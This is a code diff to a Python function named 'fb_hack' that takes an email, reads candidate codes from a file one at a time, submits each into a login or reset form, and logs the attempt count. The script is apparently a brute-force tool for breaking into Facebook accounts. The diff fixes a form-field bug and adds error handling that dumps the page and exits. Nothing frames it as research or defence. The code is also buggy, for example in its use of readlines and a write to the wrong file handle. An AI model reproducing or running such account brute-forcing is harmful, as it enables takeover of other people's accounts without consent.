@@ -85,7 +85,7 @@ def fb_hack(email, codex):
       y = f.readlines(attempt)
       attempt += 1
       try:
-        browser.form[str=='n'] = y
+        browser.form['n'] = y
         browser.submit()
         print(y, end='\r')
         fail = (y, "failed")
@@ -126,14 +126,27 @@ def fb_hack(email, codex):
       browser.select_form(nr=0)
       y = f.readlines(attempt)
       attempt += 1
-      browser.form[str=='n'] = y
-      browser.submit()
-      print(str(y), end='\r')
-      fail = (y, "failed")
-      success = (y, "succeded")
-      s = " "
-      reset -= 1
-      reset1 = reset
+      try:
+        browser.form['n'] = y
+        browser.submit()
+        print(str(y), end='\r')
+        fail = (y, "failed")
+        success = (y, "succeded")
+        s = " "
+        reset -= 1
+        reset1 = reset
+      except:
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        with open("output1.html", "w") as file:
+          file.write(str(soup))
+        with open("output1.txt", "w") as file:
+          file.write(str(soup))
+        with open("passcoder.txt", "a+") as z:
+          f.write(str(attempt))
+          f.close()
+        print("error")
+        sys.exit()
       with open("passcoder.txt", "a") as z:
         z.write(str(reset1))
         z.close()
